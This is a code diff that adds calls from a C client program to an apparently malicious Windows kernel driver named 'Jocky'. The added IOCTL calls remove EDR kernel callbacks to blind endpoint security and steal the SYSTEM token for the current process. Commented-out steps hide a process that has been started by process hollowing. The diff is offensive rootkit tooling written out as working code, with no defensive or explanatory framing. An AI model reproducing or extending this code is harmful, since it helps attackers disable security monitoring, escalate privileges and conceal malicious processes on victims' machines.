@@ -66,6 +66,53 @@ int main() {
         printf("%s IOCTL_JOCKY_ENUM_PROCS failed. Error: %lu\n", e, GetLastError());
     }
 
+    // --- IOCTL 3: Remove EDR Callbacks ---
+    printf("%s Removing EDR kernel callbacks...\n", i);
+
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_JOCKY_REMOVE_CALLBACKS,
+        NULL, 0,
+        NULL, 0,
+        &bytesReturned,
+        NULL
+    );
+
+    if (result)
+        printf("%s IOCTL_JOCKY_REMOVE_CALLBACKS: EDR blinded\n", k);
+    else
+        printf("%s REMOVE_CALLBACKS failed: %lu\n", e, GetLastError());
+
+    // --- IOCTL 4: Steal SYSTEM token into current process ---
+    printf("%s Stealing SYSTEM token...\n", i);
+
+    JOCKY_PID_INPUT tokenInput = { GetCurrentProcessId() };
+    bytesReturned = 0;
+
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_JOCKY_STEAL_TOKEN,
+        &tokenInput, sizeof(tokenInput),
+        NULL, 0,
+        &bytesReturned,
+        NULL
+    );
+
+    if (result)
+        printf("%s IOCTL_JOCKY_STEAL_TOKEN: Now running as SYSTEM\n", k);
+    else
+        printf("%s STEAL_TOKEN failed: %lu\n", e, GetLastError());
+
+    // --- IOCTL 5: Run hollow pipeline then hide the process ---
+    // (call your hollow.cpp pipeline here, get the PID)
+    // DWORD hollowedPid = RunHollowPipeline();
+
+    // Then hide it:
+    // JOCKY_PID_INPUT hideInput = { hollowedPid };
+    // DeviceIoControl(hDevice, IOCTL_JOCKY_HIDE_PROCESS,
+    //     &hideInput, sizeof(hideInput),
+    //     NULL, 0, &bytesReturned, NULL);
+
     CloseHandle(hDevice);
     return 0;
 }
